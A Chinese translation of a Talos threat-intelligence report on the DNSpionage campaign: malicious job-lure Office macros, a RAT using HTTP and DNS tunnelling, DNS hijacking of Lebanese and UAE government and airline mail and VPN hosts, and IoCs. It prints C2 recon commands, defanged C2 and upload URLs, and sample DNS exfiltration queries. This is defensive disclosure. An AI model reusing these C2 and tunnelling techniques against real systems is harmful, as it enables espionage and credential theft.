> 原文链接: https://www.anquanke.com//post/id/166739 


# DNSpionage：针对中东的攻击活动


                                阅读量   
                                **159213**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Talosintelligence，文章来源：talosintelligence.com
                                <br>原文地址：[https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html](https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t011cf2e8acd305b509.jpg)](https://p5.ssl.qhimg.com/t011cf2e8acd305b509.jpg)



## 一、前言

思科Talos团队最近发现了针对黎巴嫩和阿拉伯联合酋长国（阿联酋，UAE）的新一波攻击活动，此次攻击活动波及`.gov`域名以及一家私营的黎巴嫩航空公司。 根据我们的研究，这个攻击组织显然精心研究了受害者的网络基础设施，尽力保持隐蔽性，使攻击过程尽可能不引起他人注意。

根据攻击者的基础设施及TTP（战术、技术和过程）特征，我们无法将该攻击组织与最近观察到的其他攻击活动或攻击者关联在一起。该攻击组织使用了两个虚假的恶意网站，其中托管了伪装成招聘文书的Microsoft Office恶意文档，文档中嵌入用来入侵目标用户的恶意宏。我们将攻击者所使用的恶意软件标识为DNSpionage，该恶意软件能够以HTTP和DNS协议与攻击者通信。

在另一次攻击活动中，攻击者使用相同的IP来重定向合法的`.gov`域名以及私有公司域名DNS请求。在每次DNS重定向攻击中，攻击者都会精心准备，为重定向域名生成Let’s Encrypt证书。这些证书能够为用户免费提供X.509 TLS证书。到目前为止，我们尚不清楚之前的DNS重定向攻击是否已成功实施。

在本文中，我们会详细介绍攻击者所使用的方法，分析攻击者如何使用恶意文档诱导用户，使用户打开伪装成服务求职者的恶意网站。此外，我们也会介绍恶意DNS重定向攻击及攻击事件时间线。



## 二、攻击方法

### <a class="reference-link" name="%E4%BC%AA%E8%A3%85%E7%9A%84%E6%B1%82%E8%81%8C%E7%BD%91%E7%AB%99"></a>伪装的求职网站

攻击者首先使用两个恶意网站来尝试攻击目标用户，这两个网站伪装成提供各种工作职位的合法站点：

```
hr-wipro[.]com (重定向至wipro.com)
hr-suncor[.]com (重定向至suncor.com)
```

这些网站托管了一个Microsoft Office恶意文档：`hxxp://hr-suncor[.]com/Suncor_employment_form[.]doc`。

该文档实际上是Suncor Energy（加拿大一家可持续能源公司）官网上一份合法文件的拷贝，其中包含恶意宏组件。

此时我们尚未澄清目标用户通过何种方式看到这些链接。攻击者很有可能通过电子邮件钓鱼攻击来发送恶意文档，但也有可能通过社交平台（如LinkedIn）来传播恶意链接，使这种求职攻击更加真实。

### <a class="reference-link" name="%E6%81%B6%E6%84%8FOffice%E6%96%87%E6%A1%A3"></a>恶意Office文档

打开第一个Office文档后，用户会看到一个提示消息，声称文档的“内容模式可用”。

[![](https://p2.ssl.qhimg.com/t01141c4b024044f421.png)](https://p2.ssl.qhimg.com/t01141c4b024044f421.png)

### <a class="reference-link" name="%E6%81%B6%E6%84%8F%E5%AE%8F"></a>恶意宏

恶意样本中包含的宏主要执行如下两个步骤：

1、当文档打开时，使用base64解码经过编码的一个PE文件，然后将其释放到当前系统中，具体路径为`%UserProfile%\.oracleServices\svchost_serv.doc`。

2、当文档关闭时，将`svchost_serv.doc`重命名为`svchost_serv.exe`，然后创建名为`chromium updater v 37.5.0`的计划任务，以便执行该程序。计划任务会立即执行，并且每分钟都会重复执行。

恶意样本通过这两个步骤来规避沙盒检测。

只有当Microsoft Office被关闭时才会执行攻击载荷，意味着载荷部署过程中需要用户交互。样本中包含的宏同样使用密码保护，避免用户通过Microsoft Office查看宏代码。

此外，宏还用到了经典的字符串混淆技术来规避基于字符串的检测机制：

[![](https://p0.ssl.qhimg.com/t010cc37761b3fbbac4.png)](https://p0.ssl.qhimg.com/t010cc37761b3fbbac4.png)

宏使用拼接方式生成`schedule.service`字符串。最终攻击载荷是一款远程管理工具，我们将其标识为`DNSpionage`。



## 三、DNSpionage恶意软件

### <a class="reference-link" name="%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90"></a>恶意软件分析

恶意文档所释放的恶意软件是之前未公开的一款远程管理工具。由于该工具使用了DNS隧道技术来与攻击者的基础设施通信，因此我们将其标识为`DNSpionage`。

DNSpionage会在当前运行目录中生成相关数据：

```
%UserProfile%.oracleServices/
%UserProfile%.oracleServices/Apps/
%UserProfile%.oracleServices/Configure.txt
%UserProfile%.oracleServices/Downloads/
%UserProfile%.oracleServices/log.txt
%UserProfile%.oracleServices/svshost_serv.exe
%UserProfile%.oracleServices/Uploads/
```

攻击者使用`Downloads`目录来保存从C2服务器下载的其他脚本及工具。

将文件上传至C2服务器之前，攻击者会使用`Uploads`目录来临时存放这些文件。

攻击者以明文格式将相关日志保存到`log.txt`文件中，所执行的命令及结果也会记录该文件中。

`Configure.txt`文件中包含恶意软件配置信息。攻击者可以指定命令及控制（C2）服务器URL、URI以及充当DNS掩护隧道的域名。此外，攻击者可以指定混淆过程中使用的自定义base64字符表。我们发现攻击者会为每个目标定制字母表。

传输的所有数据都使用JSON格式，因此恶意软件的大部分代码都与JSON库有关。

### <a class="reference-link" name="%E9%80%9A%E4%BF%A1%E6%B8%A0%E9%81%93"></a>通信渠道

恶意软件使用HTTP及DNS协议来与C2服务器通信。

**HTTP模式**

恶意软件会向`0ffice36o[.]com`发起DNS请求，请求中携带使用base64编码过的随机数据。恶意软件利用该请求在服务器上注册当前被感染的系统，接收HTTP服务器的IP地址（分析过程中该IP为`185.20.184.138`）。典型的DNS请求如下：

```
yyqagfzvwmd4j5ddiscdgjbe6uccgjaq[.]0ffice36o[.]com
```

恶意软件也可以构造DNS请求，为攻击者提供更多信息。典型的请求如下：

```
oGjBGFDHSMRQGQ4HY000[.]0ffice36o[.]com
```

在如上域名中，前4个字符由恶意软件使用`rand()`随机生成。剩下的域名使用base32编码生成，解码后的值为`1Fy2048`。其中`Fy`为目标ID，`2048`（`0x800`）代表`Config file not found`（“未找到配置文件”）。如果恶意软件未能在被感染主机上找到配置文件，则会发起该请求，将消息发送给攻击者。

随后，恶意软件首先会发起一次HTTP请求（`hxxp://IP/Client/Login?id=Fy`），接收配置文件。

该请求可以用来创建配置文件，设置自定义的base64字母表。

第二个请求会发往`hxxp://IP/index.html?id=XX`（其中`XX`为被感染系统的ID值）。

该请求的目的是接收攻击者发送的命令。这是伪装成维基百科的一个网站：

[![](https://p0.ssl.qhimg.com/t0101a2da14bbf3917d.png)](https://p0.ssl.qhimg.com/t0101a2da14bbf3917d.png)

攻击者将命令嵌入到网页的源码中：

[![](https://p1.ssl.qhimg.com/t019247b025bef6b169.png)](https://p1.ssl.qhimg.com/t019247b025bef6b169.png)

在这个攻击案例中，由于我们没有收到自定义的字母表，因此攻击者使用的是标准的base64算法。还有其他案例在配置文件中使用了自定义的字母表，如下所示：

[![](https://p4.ssl.qhimg.com/t016c9bc815b42303d6.png)](https://p4.ssl.qhimg.com/t016c9bc815b42303d6.png)

自动发送到被感染系统的3条命令如下所示：

```
`{`"c": "echo %username%", "i": "-4000", "t": -1, "k": 0`}`
`{`"c": "hostname", "i": "-5000", "t": -1, "k": 0`}`
`{`"c": "systeminfo | findstr /B /C:"Domain"", "i": "-6000", "t": -1, "k": 0`}`
```

执行这些命令后，恶意软件会生成如下信息：

[![](https://p3.ssl.qhimg.com/t018cc36ed77f964d7e.png)](https://p3.ssl.qhimg.com/t018cc36ed77f964d7e.png)

攻击者请求当前系统的用户名及主机名来获取受影响的用户域环境信息。很明显这是一个侦察踩点过程，所收集到的数据最终会发往`hxxp://IP/Client/Upload`。

最后，恶意软件使用`CreateProcess()`来执行这些命令，所生成的结果被重定向到恶意软件使用`CreatePipe()`创建的一个管道。

**DNS模式**

恶意软件也可以只使用DNS模式。在该模式中，命令及响应数据都通过DNS协议来处理。攻击者可以在被感染主机的`configure.txt`文件中指定使用该模式。某些情况下，攻击者可以使用DNS协议来返回收集到的信息，避免通信数据被代理或者Web过滤器拦截。

首先，恶意软件会发起DNS请求获取命令，如下所示：

```
RoyNGBDVIAA0[.]0ffice36o[.]com
```

前4个字符可以直接忽略（如前文所示，这是随机生成的字符），有价值的信息为`GBDVIAA0`，解码（base32）后的值为`0GTx00`，其中`GT`为目标ID，`\x00`为请求号。在响应数据中，C2服务器会返回一个IP地址。虽然这个地址并不总是有效的IP地址（如`0.1.0.3`），但DNS协议支持使用这些地址。我们认为第一个值（`0x0001`）为下一次DNS请求的命令ID，而`0x0003`为命令的大小。

随后，恶意软件使用该命令ID来发起DNS查询请求：

```
t0qIGBDVIAI0[.]0ffice36o[.]com (GBDVIAI0 =&gt; "0GTx01")
```

C2服务器会返回一个新的IP地址：`100.105.114.0`。如果我们将该值转换为ASCII格式，则可以得到`dirx00`结果，也就是待执行的下一条命令。

接下来，恶意软件会将命令执行结果通过多个DNS请求发送给服务器：

```
gLtAGJDVIAJAKZXWY000.0ffice36o[.]com -&gt; GJDVIAJAKZXWY000 -&gt; "2GTx01 Vol"
TwGHGJDVIATVNVSSA000.0ffice36o[.]com -&gt; GJDVIATVNVSSA000 -&gt; "2GTx02ume"
1QMUGJDVIA3JNYQGI000.0ffice36o[.]com -&gt; GJDVIA3JNYQGI000 -&gt; "2GTx03in d"
iucCGJDVIBDSNF3GK000.0ffice36o[.]com -&gt; GJDVIBDSNF3GK000 -&gt; "2GTx04rive"
viLxGJDVIBJAIMQGQ000.0ffice36o[.]com -&gt; GJDVIBJAIMQGQ000 -&gt; "2GTx05 C h"
[...]
```

### <a class="reference-link" name="%E5%8F%97%E5%AE%B3%E8%80%85%E5%88%86%E5%B8%83%E6%83%85%E5%86%B5"></a>受害者分布情况

在DNS特征及Cisco Umbrella解决方案的帮助下，我们成功识别出某些受害者被攻击的时间，以及攻击者在10月和11月份的攻击活动。前面提到的`0ffice36o[.]com`域名的活动数据如下图所示：

[![](https://p2.ssl.qhimg.com/t01404ad2d164bcbdd5.png)](https://p2.ssl.qhimg.com/t01404ad2d164bcbdd5.png)

这些请求都来自于黎巴嫩及阿联酋，这也与下文我们介绍的DNS重定向信息相匹配。



## 四、DNS重定向

### <a class="reference-link" name="%E6%A6%82%E8%BF%B0"></a>概述

Talos发现有3个IP与DNSpionage所使用的域名有关：

```
185.20.184.138
185.161.211.72
185.20.187.8
```

这3个IP都托管在DeltaHost上。

攻击者在9月到11月之间的DNS重定向攻击中使用到了最后一个IP。隶属于黎巴嫩和阿联酋公共部门的多个域名服务器以及黎巴嫩境内的一些公司受此次攻击影响，其名下的主机名被指向攻击者控制的IP地址。攻击者在一小段时间窗口内将这些主机名重定向到`185.20.187.8`地址。在重定向IP之前，攻击者会使用“Let’s Encrypt”服务创建与域名匹配的一个证书。

在这部分内容中，我们将向大家介绍我们识别出的所有DNS重定向攻击案例以及攻击者所生成的证书。我们并不清楚先前的攻击是否已经成功，以及DNS重定向攻击的真正目的。然而这种攻击可能影响深远，因为攻击者可以在攻击时间段内拦截访问这类域名的所有流量。由于攻击者重点关注的是电子邮件以及VPN流量，因此攻击者可能通过此次攻击来窃取其他信息，如邮箱以及/或者VPN凭据。

由于用户收到的邮件也会流经攻击者的IP地址，因此如果用户使用了多因素认证（MFA），攻击者也有可能获取并滥用MFA认证码。由于攻击者可以访问用户邮箱，因此还可以发起其他攻击，甚至勒索目标用户。

我们发现DNS重定向攻击涉及多个位置，这些基础设施、员工或者业务流程上没有直接关联，攻击活动也涉及到公共或者私有部门。根据这些情况，我们认为这次行为并非受影响单位中某个管理员的人为失误或者错误所造成，而是由攻击者发起的DNS重定向攻击行为。

### <a class="reference-link" name="%E9%BB%8E%E5%B7%B4%E5%AB%A9%E6%94%BF%E5%BA%9C%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6"></a>黎巴嫩政府重定向攻击事件

Talos发现黎巴嫩财政部的电子邮箱域名是此次DNS重定向攻击的受害方：
- 攻击者在11月6日06:19:13 GMT将`webmail.finance.gov.lb`重定向到`185.20.187.8`，并在同一天的05:07:25创建了[Let’s Encrypt证书](https://crt.sh/?id=922787324)。
### <a class="reference-link" name="%E9%98%BF%E8%81%94%E9%85%8B%E6%94%BF%E5%BA%9C%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6"></a>阿联酋政府重定向攻击事件

阿联酋公共域名也是此次攻击目标。我们从警察部门（VPN及相关学院）和电信监管局中梳理相关域名信息：
- 攻击者在9月13日06:39:39 GMT将`adpvpn.adpolice.gov.ae`重定向至`185.20.187.8`，并在同一天的05:37:54创建了[Let’s Encrypt证书](https://crt.sh/?id=741047630)。
- 攻击者在9月15日07:17:51 GMT将`mail.mgov.ae`重定向至`185.20.187.8`，并在同一天的06:15:51GMT创建了[Let’s Encrypt证书](https://crt.sh/?id=804429558)。
- 攻击者在9月24日将`mail.apc.gov.ae`重定向至`185.20.187.8`，并在同一天的05:41:49 GMT创建了[Let’s Encrypt证书](https://crt.sh/?id=820893483)。
### <a class="reference-link" name="%E4%B8%AD%E4%B8%9C%E8%88%AA%E7%A9%BA%E5%85%AC%E5%8F%B8%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6"></a>中东航空公司重定向攻击事件

Talos发现黎巴嫩航空公司中东航空公司（MEA）也是此次DNS重定向攻击的受害者。
- 攻击者在11月14日11:58:36 GMT将`memail.mea.com.lb`重定向至`185.20.187.8`，并在同一天的10:35:10 GMT创建了 [Let’s Encrypt](https://crt.sh/?id=923463031)证书。
该证书的subject字段中包含多个备用名称，这是DNS协议支持的一个功能，可以将多个域名加入SSL通信中。

[![](https://p2.ssl.qhimg.com/t016b45676d8f87bb8e.png)](https://p2.ssl.qhimg.com/t016b45676d8f87bb8e.png)

```
memail.mea.com.lb
autodiscover.mea.com.lb
owa.mea.com.lb
www.mea.com.lb
autodiscover.mea.aero
autodiscover.meacorp.com.lb
mea.aero
meacorp.com.lb
memailfr.meacorp.com.lb
meoutlook.meacorp.com.lb
tmec.mea.com.lb
```

这些域名可以帮助我们梳理受害者相关域名，根据这一点，我们认为攻击者对受害者非常了解，才能知道攻击中需要生成的域名及证书情况。



## 五、总结

在此次调查中我们发现了两次攻击事件：DNSpionage恶意软件以及DNS重定向攻击。在恶意软件活动中，我们不知道具体的攻击目标，但可知攻击者针对的是黎巴嫩及阿联酋用户。然而，根据前文分析，我们还是能够澄清重定向攻击的具体目标。

我们有较大的把握认为这两次活动都由同一个攻击组织所主导。然而，我们并不知道攻击者的具体位置及确切动机。显然，攻击者能够在两个月时间内通过DNS重定向技术攻击两个国家的所属域名。从操作系统角度来看，攻击者还能使用Windows恶意软件，也能利用DNS窃取技术和重定向攻击来部署攻击网络。目前我们尚不了解这些DNS重定向攻击是否已成功实施，但攻击者依然在继续行动，到目前为止，攻击者在今年已经发起了5次攻击，过去两周内就有1次攻击活动。

从这些攻击活动中可知，用户应当尽可能加强端点防护及网络保护机制。这个攻击组织较为先进，针对的也是较为重要的一些目标，因此短期内他们应该不会停止行动。



## 六、IoC

相关攻击活动中涉及到的恶意软件IOC特征如下：

**伪造的求职网站：**

```
hr-wipro[.]com
hr-suncor[.]com
```

**恶意文档：**

```
9ea577a4b3faaf04a3bddbfcb934c9752bed0d0fc579f2152751c5f6923f7e14 (LB submit)
15fe5dbcd31be15f98aa9ba18755ee6264a26f5ea0877730b00ca0646d0f25fa (LB submit)
```

**DNSpionage样本：**

```
2010f38ef300be4349e7bc287e720b1ecec678cacbf0ea0556bcf765f6e073ec 82285b6743cc5e3545d8e67740a4d04c5aed138d9f31d7c16bd11188a2042969
45a9edb24d4174592c69d9d37a534a518fbe2a88d3817fc0cc739e455883b8ff
```

**C2服务器IP：**

```
185.20.184.138
185.20.187.8
185.161.211.72
```

**C2服务器域名：**

```
0ffice36o[.]com
```

**DNS劫持域名（指向`185.20.187.8`）：**

```
2018-11-14 : memail.mea.com.lb
2018-11-06 : webmail.finance.gov.lb
2018-09-24 : mail.apc.gov.ae
2018-09-15 : mail.mgov.ae
2018-09-13 : adpvpn.adpolice.gov.ae
```

**MFA证书中包含的域名（指向`185.20.187.8`）：**

```
memail.mea.com.lb
autodiscover.mea.com.lb
owa.mea.com.lb
www.mea.com.lb
autodiscover.mea.aero
autodiscover.meacorp.com.lb
mea.aero
meacorp.com.lb
memailr.meacorp.com.lb
meoutlook.meacorp.com.lb
tmec.mea.com.lb
```
